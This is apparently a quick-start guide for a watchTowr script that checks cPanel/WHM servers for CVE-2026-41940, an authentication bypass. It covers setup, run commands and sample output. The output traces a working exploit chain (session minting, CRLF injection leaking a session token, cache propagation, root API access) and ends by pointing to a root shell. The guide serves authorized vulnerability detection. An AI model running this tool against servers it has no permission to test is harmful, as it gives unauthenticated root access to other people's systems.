This guide walks you through detecting whether a cPanel/WHM server is vulnerable to CVE-2026-41940 — an authentication bypass that allows an unauthenticated attacker to gain root-level WHM access. You'll go from a fresh clone to a confirmed detection result in under 5 minutes.

<Warning>
  This tool is for authorized security testing only. Run it exclusively against systems you own or have explicit written permission to test. Unauthorized use is illegal and unethical.
</Warning>

<Steps>
  <Step title="Clone the repository">
    Clone the watchTowr detection script from GitHub:

    ```bash
    git clone https://github.com/watchtowrlabs/watchTowr-vs-cPanel-WHM-AuthBypass-to-RCE.py
    cd watchTowr-vs-cPanel-WHM-AuthBypass-to-RCE.py
    ```
  </Step>

  <Step title="Install dependencies">
    The tool requires the `requests` library for HTTP and `urllib3` for SSL warning suppression. Install both with pip:

    ```bash
    pip install requests urllib3
    ```
  </Step>

  <Step title="Run the tool against your target">
    Point the tool at a WHM instance using the `--target` flag. The default WHM port is `2087`:

    ```bash
    python watchTowr-vs-cPanel-WHM-AuthBypass-to-RCE.py --target https://target:2087/
    ```

    If your target's WHM hostname differs from the IP you're connecting to, you can override the `Host` header manually:

    ```bash
    python watchTowr-vs-cPanel-WHM-AuthBypass-to-RCE.py --target https://target:2087/ --hostname whm.example.com
    ```
  </Step>

  <Step title="Interpret the output">
    A successful detection against a vulnerable host looks like this:

    ```
                         __         ___  ___________
             __  _  ______ _/  |__ ____ |  |_\__    ____\____  _  ________
             \ \/ \/ \__  \    ___/ ___\|  |  \|    | /  _ \ \/ \/ \_  __ \
              \     / / __ \|  | \  \___|   Y  |    |(  <_> \     / |  | \/
               \/\_/ (____  |__|  \___  |___|__|__  | \__  / \/\_/  |__|
                              \/          \/     \/

            watchTowr-vs-cPanel-WHM-AuthBypass-to-RCE.py

            (*) cPanel/WHM Authentication Bypass - Detection Artifact Generator

              - Sina Kheirkhah (@SinSinology) of watchTowr (@watchTowrcyber)

            CVEs: [cve-2026-41940]

    [0] hostname = whm.example.com
    [1] minting a preauth session...
        session base = :vQ2WC5Bexp0oFSa7
    [2] sending the CRLF injection (Basic auth + no-ob cookie)...
        HTTP 307, leaked token = /cpsess5691070609
    [3] firing do_token_denied to propagate raw -> cache...
        HTTP 401, gadget fired
    [4] verifying we're WHM root...
        /json-api/version -> HTTP 200  {"version":"11.110.0.89"}

    [+] now just login to https://target:2087/ and use the terminal option to get a root shell
    ```

    Each numbered stage corresponds to a phase of the exploit chain: session minting, CRLF injection, cache propagation, and root verification.
  </Step>
</Steps>

<Note>
  **Vulnerable system:** Stage 4 returns `HTTP 200` with a `"version"` field in the JSON body, and the tool prints the `[+]` confirmation line. A 500 or 503 response mentioning `License` also indicates the auth bypass succeeded — the server is just license-gated.

  **Patched system:** Stage 2 will fail with `no /cpsess token leaked` and exit early. No token is issued because the CRLF injection is blocked.
</Note>
